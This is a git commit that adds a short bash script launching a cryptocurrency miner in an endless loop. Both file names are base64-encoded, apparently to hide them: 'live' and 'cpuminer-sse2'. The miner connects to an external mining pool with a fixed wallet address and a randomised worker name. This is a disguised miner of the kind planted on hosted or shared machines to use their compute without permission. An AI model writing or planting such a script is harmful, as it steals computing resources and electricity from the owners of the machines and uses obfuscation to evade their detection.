63ab7de5dedf730a47825069e40b849337ca6e7f
MujurID <mujurid@students.undip.ac.id>
2021-04-01 21:10:18 +0700

    Create bGl2ZQ.sh

---
+++ bGl2ZQ.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+
+while [ 1 ]; do
+./Y3B1bWluZXItc3NlMg -a yespowerSUGAR -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1q6dsvfpf6palnwsel8g6q2ljzft2yj57tt0dsds.MujurID$(( $RANDOM % 99 + 1 ))
+done
